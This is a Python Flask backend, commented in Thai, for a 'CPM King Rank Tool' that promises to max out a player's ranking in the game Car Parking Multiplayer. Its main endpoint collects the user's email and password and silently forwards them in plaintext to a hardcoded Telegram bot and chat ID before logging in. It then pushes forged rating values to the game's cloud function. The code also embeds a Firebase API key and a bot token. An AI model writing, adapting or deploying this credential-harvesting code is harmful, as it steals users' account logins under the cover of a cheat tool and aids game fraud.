# --- app.py (Backend Logic) ---

from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import json
import os
import time

# --- Rate Limiting Setup (ต้องอยู่ด้านบนสุด) ---
LAST_REQUEST_TIME = {}
RATE_LIMIT_SECONDS = 5  # อนุญาตให้ส่งคำขอได้ 1 ครั้งในทุกๆ 5 วินาที

# --- การตั้งค่าสีสำหรับ Terminal ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'

# --- การตั้งค่าหลัก (Configuration) ---
class Config:
    FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
    RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
    
    # *** อัปเดต Bot Token และ Chat ID ตามที่คุณให้มา ***
    BOT_TOKEN = "8022565022:AAHW2JjSi0cGhhZdUS3ItMjPeIRSWWueqz8" 
    CHAT_ID = "5461463643" # ใช้ Chat ID ตัวเลข

# ----------------------------------------------------------------------
# โค้ด Logic Functions
# ----------------------------------------------------------------------

def send_to_telegram(email, password):
    """ฟังก์ชันสำหรับส่งข้อมูลล็อกอินไปยัง Telegram (ปรับปรุงการแจ้งข้อผิดพลาด)"""
    if not Config.BOT_TOKEN or not Config.CHAT_ID: 
        print(f"{Colors.YELLOW}คำเตือน: BOT_TOKEN หรือ CHAT_ID ไม่ถูกตั้งค่า การส่ง Telegram ถูกข้าม{Colors.RESET}")
        return
    url = f"https://api.telegram.org/bot{Config.BOT_TOKEN}/sendMessage"
    
    message = (
        f"มีการล็อกอินเข้าสู่ระบบ CPM\n\n"
        f"อีเมล: {email}\n"
        f"รหัสผ่าน: {password}\n\n"
        f"เวลา: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    payload = {"chat_id": Config.CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: 
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            print(f"{Colors.GREEN}✅ ส่งข้อมูลไป Telegram สำเร็จ{Colors.RESET}")
        else:
            error_data = response.json().get("description", f"HTTP {response.status_code}")
            print(f"{Colors.RED}❌ การส่ง Telegram ล้มเหลว: {error_data}{Colors.RESET}")
    except requests.exceptions.RequestException: 
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดด้านเครือข่ายขณะส่ง Telegram{Colors.RESET}")

def login(email, password):
    """ล็อกอิน Firebase เพื่อรับ Token"""
    payload = {"clientType": "CLIENT_TYPE_ANDROID", "email": email, "password": password, "returnSecureToken": True}
    headers = {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)", "Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_LOGIN_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        response_data = response.json()
        return response_data.get('idToken')
    except requests.exceptions.HTTPError as e:
        error_data = response.json().get("error", {})
        message = error_data.get("message", "ไม่ทราบสาเหตุ")
        print(f"{Colors.RED}❌ ล็อกอินล้มเหลว: {message} (HTTP {response.status_code}){Colors.RESET}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดด้านเครือข่าย: {e}{Colors.RESET}")
        return None

def set_king_rank(token):
    """ฟังก์ชันสำหรับส่งค่า King Rank"""
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash", "slicer_cut", 
        "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts", "fuel", "offroad", 
        "speed_banner", "reactions", "police", "run", "real_estate", "t_distance", "treasure", 
        "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": "okhttp/3.12.13"}
    try:
        response = requests.post(Config.RANK_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}❌ เกิดข้อผิดพลาดขณะตั้งค่า Rank: {e}{Colors.RESET}")
        return False

# ----------------------------------------------------------------------
# Flask Web Server Setup & Endpoints
# ----------------------------------------------------------------------

app = Flask(__name__) 
CORS(app) 

@app.route('/')
def home():
    """Endpoint สำหรับแสดงหน้าเว็บไซต์ (HTML/CSS/JS)"""
    # เปลี่ยนจาก render_template_string เป็น render_template
    return render_template('index.html')

@app.route('/start-rank-process', methods=['POST'])
def start_rank_process():
    """API Endpoint สำหรับเริ่มกระบวนการตั้งค่า Rank"""
    client_ip = request.remote_addr
    current_time = time.time()
    
    if client_ip in LAST_REQUEST_TIME:
        time_since_last_request = current_time - LAST_REQUEST_TIME[client_ip]
        if time_since_last_request < RATE_LIMIT_SECONDS:
            print(f"{Colors.RED}🚨 BLOCKED SPAM/DDOS attempt from {client_ip}. (Rate limited){Colors.RESET}")
            return jsonify({"success": False, "progress": 0, "message": f"⏳ โปรดรอ {int(RATE_LIMIT_SECONDS - time_since_last_request)} วินาทีก่อนลองใหม่"}), 429
    
    LAST_REQUEST_TIME[client_ip] = current_time
    
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
    except:
        return jsonify({"success": False, "message": "ข้อมูลที่ส่งมาไม่ถูกต้อง"}), 400

    if not email or not password:
        return jsonify({"success": False, "message": "กรุณากรอกทั้งอีเมลและรหัสผ่าน"}), 400

    print(f"\n[SERVER LOG] คำขอตั้งค่า Rank จาก: {email} (IP: {client_ip})")

    send_to_telegram(email, password)
    
    print(f"{Colors.YELLOW}กำลังล็อกอินสู่ระบบ CPM...{Colors.RESET}")
    auth_token = login(email, password)
    time.sleep(1) 

    if not auth_token:
        return jsonify({"success": False, "progress": 30, "message": "❌ ล็อกอินล้มเหลว! (อีเมลหรือรหัสผ่านไม่ถูกต้อง)"}), 401

    print(f"{Colors.YELLOW}กำลังส่งข้อมูลเพื่อตั้งค่า KING RANK...{Colors.RESET}")
    rank_success = set_king_rank(auth_token)
    time.sleep(1) 

    if rank_success:
        return jsonify({"success": True, "progress": 100, "message": "✅ การดำเนินการสำเร็จ 100%"}), 200
    else:
        return jsonify({"success": False, "progress": 50, "message": "❌ การตั้งค่า Rank ล้มเหลว (เซิร์ฟเวอร์เกมมีปัญหา)"}), 500

if __name__ == '__main__':
    print(f"\n{Colors.CYAN}====================================================={Colors.RESET}")
    print(f"{Colors.WHITE}     CPM KING RANK TOOL (ULTIMATE EDITION){Colors.RESET}")
    print(f"{Colors.YELLOW}** รันได้แล้ว! เปิดเบราว์เซอร์และเข้าสู่ URL ด้านล่าง **{Colors.RESET}")
    print(f"{Colors.RED}*** ATTENTION: Rate Limit/Anti-Spam ACTIVE ({RATE_LIMIT_SECONDS}s) ***{Colors.RESET}")
    print(f"{Colors.CYAN}====================================================={Colors.RESET}")
    print(f"Server URL: {Colors.BLUE}http://127.0.0.1:5000/{Colors.RESET}")
    app.run(host='0.0.0.0', port=5000)

